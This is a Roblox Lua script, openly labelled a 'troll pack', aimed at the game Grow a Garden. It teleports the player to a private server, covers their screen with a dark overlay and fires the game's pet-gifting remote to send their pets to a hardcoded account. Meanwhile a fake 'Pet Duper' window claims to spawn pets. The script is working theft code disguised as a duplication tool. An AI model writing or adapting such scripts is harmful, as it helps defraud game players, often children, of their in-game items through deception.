-- 📦 COMBINED SCRIPT: Grow a Garden Troll Pack by Arjun
-- Includes: Teleport, Fake Gift + Freeze, Fake Pet Duper GUI

--🔁 TELEPORT TO PRIVATE SERVER
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

local placeId = 9872472334
local accessCode = "6ecc336c-ff8c-4d3b-bd70-94e35c571d11" -- << Replace this if needed

TeleportService:TeleportToPrivateServer(placeId, accessCode, {player})

-- 🎁 FREEZE SCREEN
local targetPets = {
    "Kitsune",
    "Corrupted Kitsune",
    "Dragonfly",
    "Raccoon",
    "Mimic Octopus"
}

local function freezeScreen()
    local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    screenGui.Name = "FreezeOverlay"

    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.3
end

-- 🎯 PET GIFT FUNCTION (fixed from remote spy log)
local function giftPets(targetPlayer)
    local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
    event:FireServer("GivePet", targetPlayer)
end

-- 🔃 Run freeze + gift (change target player name)
freezeScreen()
giftPets("gta5playrr") -- << Replace this too

-- 💀 FAKE PET DUPER GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "FakePetDuper"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 350, 0, 280)
frame.Position = UDim2.new(0.5, -175, 0.5, -140)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "🐾 Pet Duper v4.2"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 22

local petLabel = Instance.new("TextButton", frame) -- changed to button so it can be clicked
petLabel.Position = UDim2.new(0.05, 0, 0.2, 0)
petLabel.Size = UDim2.new(0.9, 0, 0, 30)
petLabel.Text = "Pet: Kitsune"
petLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
petLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
petLabel.Font = Enum.Font.Gotham
petLabel.TextSize = 18

local currentIndex = 1
petLabel.MouseButton1Click:Connect(function()
    currentIndex = currentIndex + 1
    if currentIndex > #targetPets then currentIndex = 1 end
    petLabel.Text = "Pet: " .. targetPets[currentIndex]
end)

local qtyBox = Instance.new("TextBox", frame)
qtyBox.Position = UDim2.new(0.05, 0, 0.38, 0)
qtyBox.Size = UDim2.new(0.9, 0, 0, 30)
qtyBox.Text = "10"
qtyBox.PlaceholderText = "Quantity"
qtyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
qtyBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
qtyBox.Font = Enum.Font.Gotham
qtyBox.TextSize = 18

local spawnBtn = Instance.new("TextButton", frame)
spawnBtn.Position = UDim2.new(0.05, 0, 0.56, 0)
spawnBtn.Size = UDim2.new(0.9, 0, 0, 35)
spawnBtn.Text = "Spawn Pet"
spawnBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
spawnBtn.BackgroundColor3 = Color3.fromRGB(60, 130, 60)
spawnBtn.Font = Enum.Font.GothamBold
spawnBtn.TextSize = 20
Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0, 8)

local output = Instance.new("TextLabel", frame)
output.Position = UDim2.new(0.05, 0, 0.75, 0)
output.Size = UDim2.new(0.9, 0, 0, 40)
output.Text = ""
output.TextColor3 = Color3.fromRGB(180, 255, 180)
output.BackgroundTransparency = 1
output.Font = Enum.Font.Gotham
output.TextSize = 16

spawnBtn.MouseButton1Click:Connect(function()
    local petName = targetPets[currentIndex]
    local qty = tonumber(qtyBox.Text)
    if qty and qty > 0 then
        output.Text = "✅ Spawned " .. qty .. "x " .. petName
    else
        output.Text = "❌ Invalid quantity"
    end
end)
